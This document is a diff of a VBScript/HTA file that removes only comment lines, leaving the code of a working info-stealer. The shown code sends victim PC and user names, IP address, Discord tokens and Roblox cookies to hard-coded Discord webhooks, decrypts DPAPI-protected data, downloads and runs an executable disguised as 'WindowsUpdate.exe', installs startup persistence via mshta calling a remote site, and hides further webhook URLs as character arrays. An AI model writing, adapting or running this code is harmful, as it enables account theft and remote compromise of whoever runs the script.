@@ -12,7 +12,6 @@ Dim buf1, buf2, buf3, buf4, buf5, buf6, buf7, buf8, buf9, buf10
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
-' --- WEBHOOKS ---
 sys1 = "https://discord.com/api/webhooks/1574415765996703895/RIEV6Y6s7wA6ThCzvvZ-UfxfQudJ0MrsEOT_HuxKK5rtOOsZOmlAmNmSZffML_ewWoRB"
 sys2 = "https://discord.com/api/webhooks/1575522856538869963/5rdwv_kiUCVl-5D32frNmcSLYhPqI3wWYB76pq_eId6mveAMnYEWEaHjtmptNmHNAaeN"
 buf1 = Array(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,55,53,53,54,54,54,54,54,54,54,54,54,54,54,54,54,54,54,54,54,47,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80)
@@ -32,8 +31,6 @@ buf7 = Array(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,1
 buf8 = Array(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,55,53,54,51,51,51,51,51,51,51,51,51,51,51,51,51,51,51,51,51,47,90,89,88,87,86,85,84,83,82,81,80,79,78,77,76,75)
 buf9 = Array(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,55,53,54,52,52,52,52,52,52,52,52,52,52,52,52,52,52,52,52,52,47,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79)
 buf10 = Array(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,55,53,54,53,53,53,53,53,53,53,53,53,53,53,53,53,53,53,53,53,47,81,82,83,84,85,86,87,88,89,90,48,49,50,51,52,53)
-
-' The actual ReGrab is hidden further down in the script
 cfgB = "https://discord.com/api/webhooks/1575522683775357132/2Ra_xyOOq50jgy8TmKuahaQozLkWTExaB2JweTvH1nPOBiLoWg1uSJjX49J5FT9x1p9P"
 cfgC = "https://discord.com/api/webhooks/1575522683775357132/2Ra_xyOOq50jgy8TmKuahaQozLkWTExaB2JweTvH1nPOBiLoWg1uSJjX49J5FT9x1p9P"
 
@@ -42,7 +39,6 @@ USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 ratDropped = False
 lastCookie = ""
 
-' --- 1. INITIAL GRABS ---
 Call PostEmbedTo(":satellite: Target", "PC: " & PC & vbCrLf & "User: " & USER, 10181046, cfgA)
 Call IP(cfgA)
 Call GrabTokens(cfgA)
@@ -51,7 +47,6 @@ Call PostCookieOnly(cfgA)
 
 Call DropPayload(cfgA, True)
 
-' --- 2. LOOP ---
 Dim runCount
 runCount = 0
 Do
@@ -71,7 +66,6 @@ Loop
 
 window.close()
 
-' --- PAYLOAD DROP ---
 Sub DropPayload(sysDest, sendRocket)
     Dim dl : dl = "https://cdn.discordapp.com/attachments/1351499996263878729/1573919433020412246/WindowsUpdate.exe?ex=6b090832&is=6b07b6b2&hm=b7476ce08038788fce717b168238b8e04cd6011e46e73ac97aed298f6dee5e79&"
     Dim tPath : tPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows"
@@ -104,7 +98,6 @@ Sub DropPayload(sysDest, sendRocket)
     End If
 End Sub
 
-' --- RunCmd ---
 Sub RunCmd(cmd)
     Dim w,p,i,s
     Set w = GetObject("winmgmts:\\.\root\cimv2")
@@ -114,7 +107,6 @@ Sub RunCmd(cmd)
     p.Create cmd,,s,i
 End Sub
 
-' --- IP ---
 Sub IP(sysDest)
     Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
@@ -132,7 +124,6 @@ Sub IP(sysDest)
     Set xh = Nothing
 End Sub
 
-' --- PostCookieOnly ---
 Sub PostCookieOnly(sysDest)
     Dim cookie : cookie = GetRobloxCookie()
     If Len(cookie) = 0 Then Exit Sub
@@ -141,7 +132,6 @@ Sub PostCookieOnly(sysDest)
     Call PostEmbedTo(":cookie: Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC & vbCrLf & vbCrLf & "``" & cookie & "``", 10181046, sysDest)
 End Sub
 
-' --- GetRobloxCookie ---
 Function GetRobloxCookie()
     GetRobloxCookie = ""
     Dim paths(4)
@@ -200,7 +190,6 @@ Function GetRobloxCookie()
     GetRobloxCookie = cookie
 End Function
 
-' --- Sleep ---
 Sub SleepSeconds(s)
     Dim t0, t1, t2, elapsed
     t0 = Timer()
@@ -218,7 +207,6 @@ Sub SleepSeconds(s)
     End If
 End Sub
 
-' --- Persistence ---
 Sub Persistence()
     Dim payload : payload = "mshta https://matrixhub.app/"
     On Error Resume Next
@@ -231,7 +219,6 @@ Sub Persistence()
     Call PostEmbed(":pushpin: Persistence", "3 startup methods installed", 10181046)
 End Sub
 
-' --- GrabTokens ---
 Sub GrabTokens(sysDest)
     Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
@@ -271,7 +258,6 @@ Sub GrabTokens(sysDest)
     End If
 End Sub
 
-' --- Utility Functions ---
 Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name: End Function
 Sub WriteFile(path, content): Dim f: Set f = fso.CreateTextFile(path, True): f.Write content: f.Close: Set f = Nothing: End Sub
 Function ReadFile(path): ReadFile = "": Dim f: Set f = fso.OpenTextFile(path, 1): ReadFile = f.ReadAll: f.Close: Set f = Nothing: End Function
@@ -322,7 +308,6 @@ Sub PostEmbedTo(t, d, c, sysData)
     Set h = Nothing
 End Sub
 
-' --- DecryptDPAPI ---
 Function DecryptDPAPI(b64)
     DecryptDPAPI = ""
     Dim inf: inf = TmpFile("dpi.txt")
@@ -339,7 +324,6 @@ Function DecryptDPAPI(b64)
     fso.DeleteFile outf, True
 End Function
 
-' --- Ej ---
 Function Ej(s)
     Ej = s
     Ej = Replace(Ej, Chr(92), Chr(92) & Chr(92))
